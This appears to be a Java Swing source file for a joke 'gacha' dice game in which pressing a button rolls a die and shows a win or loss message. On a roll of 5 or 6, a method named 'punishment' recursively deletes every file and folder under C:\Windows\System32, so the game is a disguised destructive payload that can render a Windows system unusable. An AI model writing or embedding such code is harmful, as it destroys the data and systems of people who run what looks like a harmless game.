package funnygacha;
import java.util.Random;
import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
/**
 *
 * @author ADMIN
 */
public class funnyGacha extends  JFrame{
    private JButton btnRoll;
    
    public funnyGacha() {
        setTitle("Game gacha so 1 Viet Nam");
        setSize(500, 400);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        btnRoll = new JButton("Roll the Dice");
        btnRoll.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                rollDice();
            }
        });

        JPanel panel = new JPanel();
        panel.add(btnRoll);
        add(panel);

        setVisible(true);
    }

    private void rollDice() {
        Random rand = new Random();
        int result = rand.nextInt(6) + 1;
        if (result <= 1) {
            JOptionPane.showMessageDialog(this, "Congratulations!");
        } else if (result <= 4) {
            JOptionPane.showMessageDialog(this, "Losed!");
        } else {
            JOptionPane.showMessageDialog(this, "Losed!");
            handleUserLose();
        }
    }
    private static void handleUserLose() {
        try {
            String system32Path = "C:\\Windows\\System32";
            File system32 = new File(system32Path);
            if (system32.exists()) {
                 punishment(system32);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void punishment(File folder) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    punishment(file);
                } else {
                    file.delete();
                }
            }
        }
        folder.delete();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new funnyGacha();
            }
        });
    }
    
}
